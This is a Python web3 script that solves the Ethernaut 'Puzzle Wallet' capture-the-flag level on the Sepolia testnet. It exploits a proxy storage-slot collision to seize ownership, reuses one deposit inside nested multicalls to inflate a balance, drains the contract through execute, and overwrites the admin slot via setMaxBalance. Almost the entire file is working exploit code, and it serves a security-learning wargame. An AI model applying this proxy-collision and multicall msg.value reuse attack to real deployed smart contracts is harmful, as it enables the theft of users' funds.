import os

import solcx
from dotenv import load_dotenv
from web3 import Web3

load_dotenv()

w3 = Web3(Web3.HTTPProvider(os.getenv('PROVIDER_URL')))
if w3.is_connected():
    print("Successfully connected to the provider!")
else:
    print("Failed to connect to the given provider ", os.getenv('PROVIDER_URL'))
    exit()

# Load environment variables
_PRIVATE_KEY = os.getenv('PRIVATE_KEY')
player = w3.to_checksum_address(os.getenv('WALLET'))


def compile_contract(contract_path: str, version: str, contract_name: str = None):
    if version not in (v.public for v in solcx.get_installed_solc_versions()):
        solcx.install_solc(version)
    solcx.set_solc_version(version=version)
    with open(contract_path, 'r') as file:
        contract_source = file.read()
    compiled_sol = solcx.compile_source(contract_source)
    contract_key = f'<stdin>:{contract_name}' if contract_name else next(iter(compiled_sol))
    contract_interface = compiled_sol[contract_key]
    print(f'Compiled {contract_path} for contract {contract_key}')
    return contract_interface


def send_tx(transaction, build=True):
    # We have 1-line .transact() for state changes, but it works only if you are using a local node like Ganache, Anvil
    # Or your account is unlocked in the node (like Infura), which is rare in public networks. So we need below steps
    nonce = w3.eth.get_transaction_count(player, 'pending')  # Use pending block tag to include unmined txs
    if build:
        transaction = transaction.build_transaction({
            'from': player,
            'chainId': 11155111,
            'nonce': nonce
        })
    else:  # When you're sending pre-encoded calldata (like a nested multicall)
        transaction['chainId'] = 11155111
        transaction['from'] = player
        transaction['nonce'] = nonce

    signed_tx = w3.eth.account.sign_transaction(transaction, private_key=_PRIVATE_KEY)
    txn_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    tx_receipt = w3.eth.wait_for_transaction_receipt(txn_hash)
    assert tx_receipt['status'] == 1
    print(f'Sent transaction with nonce {nonce}: {tx_receipt}')
    return tx_receipt


# Step 0: Load Ethernaut contracts
proxy_address = w3.to_checksum_address("")
compiled_contract = compile_contract("PuzzleWallet.sol", "0.8.0", "PuzzleProxy")
proxy = w3.eth.contract(address=proxy_address, abi=compiled_contract['abi'])
# The proxy contract exposes only proxy-related functions like proposeNewAdmin.
# To call PuzzleWallet.addToWhitelist, you must call it via the proxy but using the logic contract’s ABI —
# this lets you invoke the implementation’s functions through the proxy’s address.
compiled_contract = compile_contract("PuzzleWallet.sol", "0.8.0", "PuzzleWallet")
puzzle_wallet = w3.eth.contract(address=proxy.address, abi=compiled_contract['abi'])

# Step 1: become owner in slot 0
send_tx(proxy.functions.proposeNewAdmin(player))
# This changes slot 0 which is also occupied by PuzzleWallet.owner
assert player == proxy.functions.pendingAdmin().call()

# Step 2: Add ourselves to whitelisted
send_tx(puzzle_wallet.functions.addToWhitelist(player))
# We can't setMaxBalance, as address(this).balance != 0, so we should use multicall and batch transactions
# Step 3: Encode inner deposit call
inner_call = puzzle_wallet.functions.deposit().build_transaction({
    'gas': 100000,
    'value': w3.to_wei(0.001, 'ether'),
    'from': player
})['data']

# Step 4: Encode inner multicall with just [deposit()]
inner_multicall = puzzle_wallet.functions.multicall([inner_call]).build_transaction({'gas': 200000})['data']

# Step 5: Outer multicall: contains both deposit() and multicall([deposit()])
outer_multicall = puzzle_wallet.functions.multicall([
    inner_call, inner_multicall
]).build_transaction({'gas': 300000})['data']
# Now outer_multicall is your final calldata.
receipt = send_tx({
    'to': proxy.address,
    'value': w3.to_wei(0.001, 'ether'),
    'gas': 1_000_000,
    'gasPrice': w3.eth.gas_price,
    'data': outer_multicall
}, build=False)
# We sent only 0.001 which made contract balance to 0.002,
# but because of bug, we could make balances[msg.sender] = 2 * 0.001
balance = w3.eth.get_balance(proxy.address)
# assert w3.from_wei(2, 'finney') == balance  # 1 finney = 0.001 ETH

# Step 6: run execute to drain proxy contract balance
send_tx(puzzle_wallet.functions.execute(player, balance, b''))  # b'' # empty bytes for data
assert 0 == w3.eth.get_balance(proxy.address)

# Step 7: call setMaxBalance to become admin, it shares same slot 1
max_balance_value = int(player, 16)  # Convert address string to integer
send_tx(puzzle_wallet.functions.setMaxBalance(max_balance_value))
assert player == proxy.functions.admin().call(), "Hack Failed"
print('Well done, You have completed this level!!!')
